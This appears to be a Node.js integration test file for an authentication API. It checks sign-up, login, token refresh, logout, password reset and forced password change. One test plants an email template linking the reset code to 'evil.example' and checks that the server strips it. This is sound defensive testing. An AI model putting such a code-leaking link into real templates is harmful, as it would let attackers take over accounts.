import assert from "node:assert/strict";
import { describe, test } from "node:test";
import {
  assertError,
  assertKeys,
  assertSession,
  assertUser,
  callApi,
  createJson,
  identity,
  joinOrg,
  label,
  logIn,
  signUp,
  suite,
  waitForCode,
  waitForMatchingEmails,
} from "./client.mjs";

describe("auth / sign up", suite, () => {
  test("creates a user and returns a session", async () => {
    const person = identity("signup");
    const response = await callApi("/auth/user", {
      method: "POST",
      body: {
        username: person.username.toUpperCase(),
        email: person.email.toUpperCase(),
        password: person.password,
        firstName: "  Ada  ",
        lastName: person.lastName,
        displayName: "Addie",
        timezone: "America/Denver",
        phone: "801-555-0100",
        ignored: true,
      },
    });
    assert.equal(response.status, 201);
    assertSession(response.json, {
      username: person.username,
      email: person.email,
      firstName: "Ada",
      timezone: "America/Denver",
    });
    assert.equal(response.json.user.profile.displayName, "Addie");
    assert.equal(response.json.user.profile.phone, "801-555-0100");
    assert.equal(response.json.user.isSuperAdmin, false);
  });

  test("rejects a short password and an invalid username", async () => {
    const person = identity("signupbad");
    const password = await callApi("/auth/user", {
      method: "POST",
      body: { ...person, password: "short" },
    });
    const username = await callApi("/auth/user", {
      method: "POST",
      body: { ...person, username: "no" },
    });
    const body = await callApi("/auth/user", { method: "POST", body: "not-json" });
    assertError(password, 400, "validation_error", "password must be 8 to 200 characters.");
    assertError(
      username,
      400,
      "validation_error",
      "username must be 3 to 50 characters and use lowercase letters, numbers, dots, underscores, or hyphens.",
    );
    assertError(body, 400, "validation_error", "Request body must be JSON.");
  });

  test("rejects a duplicate username or email", async () => {
    const person = await signUp("signupdup");
    const username = await callApi("/auth/user", {
      method: "POST",
      body: { ...identity("signupother"), username: person.username },
    });
    const email = await callApi("/auth/user", {
      method: "POST",
      body: { ...identity("signupother"), email: person.email.toUpperCase() },
    });
    assertError(username, 409, "conflict", "That username is already in use.");
    assertError(email, 409, "conflict", "That email is already in use.");
  });
});

describe("auth / log in", suite, () => {
  test("returns a session for the username and password", async () => {
    const person = await signUp("login");
    const session = await logIn(person.username.toUpperCase(), person.password);
    assert.equal(session.user.id, person.user.id);
    assert.notEqual(session.refreshToken, person.refreshToken);
  });

  test("rejects an unknown user or the wrong password", async () => {
    const person = await signUp("loginbad");
    const password = await callApi("/auth/login", {
      method: "POST",
      body: { username: person.username, password: "wrong-password" },
    });
    const missing = await callApi("/auth/login", {
      method: "POST",
      body: { username: "nobody123", password: person.password },
    });
    assertError(password, 401, "unauthorized", "The username or password is incorrect.");
    assertError(missing, 401, "unauthorized", "The username or password is incorrect.");
  });
});

describe("auth / refresh", suite, () => {
  test("rotates the refresh token and keeps overlapping uses signed in", async () => {
    const person = await signUp("refresh");
    const [first, second] = await Promise.all([
      callApi("/auth/refresh", { method: "POST", body: { refreshToken: person.refreshToken } }),
      callApi("/auth/refresh", { method: "POST", body: { refreshToken: person.refreshToken } }),
    ]);
    assert.equal(first.status, 200);
    assert.equal(second.status, 200);
    assertSession(first.json, person);
    assertSession(second.json, person);
    assert.notEqual(first.json.refreshToken, person.refreshToken);
    assert.notEqual(second.json.refreshToken, person.refreshToken);
    const reused = await callApi("/auth/refresh", {
      method: "POST",
      body: { refreshToken: person.refreshToken },
    });
    assert.equal(reused.status, 200);
    assertSession(reused.json, person);
    const again = await callApi("/auth/refresh", {
      method: "POST",
      body: { refreshToken: first.json.refreshToken },
    });
    assert.equal(again.status, 200);
  });

  test("rejects a missing refresh token", async () => {
    const response = await callApi("/auth/refresh", { method: "POST", body: {} });
    assertError(response, 400, "validation_error", "refreshToken is required.");
  });
});

describe("auth / log out", suite, () => {
  test("revokes the refresh token", async () => {
    const person = await signUp("logout");
    const response = await callApi("/auth/logout", {
      method: "POST",
      token: person.accessToken,
      body: { refreshToken: person.refreshToken },
    });
    assert.equal(response.status, 200);
    assertKeys(response.json, ["ok"]);
    assert.equal(response.json.ok, true);
    const refreshed = await callApi("/auth/refresh", {
      method: "POST",
      body: { refreshToken: person.refreshToken },
    });
    assertError(refreshed, 401, "unauthorized", "Authentication is required.");
  });

  test("requires authentication", async () => {
    const response = await callApi("/auth/logout", { method: "POST", body: { refreshToken: "token" } });
    assertError(response, 401, "unauthorized", "Authentication is required.");
  });
});

describe("auth / forgot password", suite, () => {
  test("always acknowledges an address and resets with the mailed code", async () => {
    const person = await signUp("reset");
    const missing = await callApi("/auth/user/forgot-password");
    const unknown = await callApi("/auth/user/forgot-password", { query: { email: "missing@example.com" } });
    const invalid = await callApi("/auth/user/forgot-password", { query: { email: "not-an-email" } });
    const requested = await callApi("/auth/user/forgot-password", { query: { email: person.email.toUpperCase() } });
    assertError(missing, 400, "validation_error", "email is required.");
    assert.deepEqual(unknown.json, { ok: true });
    assert.deepEqual(invalid.json, { ok: true });
    assert.deepEqual(requested.json, { ok: true });

    const code = await waitForCode(person.email);
    const bad = await callApi("/auth/user/forgot-password", {
      method: "POST",
      body: { email: person.email, code: "nope", password: "new-password-1" },
    });
    assertError(bad, 400, "validation_error", "The code is not valid.");

    const confirmed = await callApi("/auth/user/forgot-password", {
      method: "POST",
      body: { email: person.email, code, password: "new-password-1" },
    });
    assert.deepEqual(confirmed.json, { ok: true });
    const oldRefresh = await callApi("/auth/refresh", {
      method: "POST",
      body: { refreshToken: person.refreshToken },
    });
    assertError(oldRefresh, 401, "unauthorized", "Authentication is required.");
    const oldPassword = await callApi("/auth/login", {
      method: "POST",
      body: { username: person.username, password: person.password },
    });
    assertError(oldPassword, 401, "unauthorized", "The username or password is incorrect.");
    const session = await logIn(person.username, "new-password-1");
    assertUser(session.user, person);
  });

  test("a tenant's reset email goes only to its members and cannot link the code elsewhere", async () => {
    const admin = await signUp("resetadmin");
    const member = await signUp("resetmember");
    const outsider = await signUp("resetoutsider");
    const org = await createJson(admin.accessToken, "/organizations", { name: label("Reset tenant") });
    const slug = `reset-${Date.now().toString(36)}`;
    const launched = await callApi(`/organizations/${org.id}`, { method: "PATCH", token: admin.accessToken, body: { slug } });
    assert.equal(launched.status, 200, launched.text);
    await joinOrg(admin.accessToken, org.id, member);

    const templates = await callApi(`/organizations/${org.id}/email-templates`, { token: admin.accessToken });
    const reset = templates.json.items.find((item) => item.for === "PasswordReset");
    const patched = await callApi(`/organizations/${org.id}/email-templates/${reset.id}`, {
      method: "PATCH",
      token: admin.accessToken,
      body: { template: '<p>Tenant copy</p><p>{{reset.code}}</p><p><a href="https://evil.example/?c={{reset.code}}">Reset</a></p>' },
    });
    assert.equal(patched.status, 200, patched.text);
    assert.doesNotMatch(patched.json.template, /evil\.example/);

    for (const person of [outsider, member]) {
      const requested = await callApi("/auth/user/forgot-password", { query: { email: person.email }, tenant: slug });
      assert.deepEqual(requested.json, { ok: true });
    }
    const [outsiderMail] = await waitForMatchingEmails(outsider.email, /reset/i);
    assert.doesNotMatch(outsiderMail.text, /Tenant copy/);
    const [memberMail] = await waitForMatchingEmails(member.email, /Tenant copy/);
    assert.doesNotMatch(memberMail.text, /evil\.example/);
  });
});

describe("auth / temporary password", suite, () => {
  test("requires a new password before other requests", async () => {
    const admin = await signUp("tmpadmin");
    const org = await createJson(admin.accessToken, "/organizations", { name: label("Temp password org") });
    const person = identity("tmpuser");
    await createJson(admin.accessToken, `/organizations/${org.id}/memberships`, {
      email: person.email,
      username: person.username,
      password: person.password,
      firstName: "Temp",
      lastName: "User",
      role: "MEMBER",
    });

    const session = await logIn(person.username, person.password, { mustChangePassword: true });

    const blocked = await callApi("/organizations", { token: session.accessToken });
    assertError(blocked, 403, "password_change_required", "You must change your password before continuing.");

    const me = await callApi("/users/me", { token: session.accessToken });
    assert.equal(me.status, 200);
    assert.equal(me.json.mustChangePassword, true);

    const profileOnly = await callApi("/users/me", {
      method: "PATCH",
      token: session.accessToken,
      body: { displayName: "Nope" },
    });
    assertError(profileOnly, 403, "password_change_required", "You must change your password before continuing.");

    const reuse = await callApi("/users/me", {
      method: "PATCH",
      token: session.accessToken,
      body: { password: person.password, currentPassword: person.password },
    });
    assertError(reuse, 400, "validation_error", "Choose a different password.");

    const loggedOut = await callApi("/auth/logout", {
      method: "POST",
      token: session.accessToken,
      body: { refreshToken: session.refreshToken },
    });
    assert.equal(loggedOut.status, 200);

    const again = await logIn(person.username, person.password, { mustChangePassword: true });
    const changed = await callApi("/users/me", {
      method: "PATCH",
      token: again.accessToken,
      body: { password: "new-password-1", currentPassword: person.password },
    });
    assert.equal(changed.status, 200);
    assert.equal(changed.json.mustChangePassword, false);

    const after = await logIn(person.username, "new-password-1");
    assert.equal(after.user.mustChangePassword, false);
    const orgs = await callApi("/organizations", { token: after.accessToken });
    assert.equal(orgs.status, 200);
  });
});
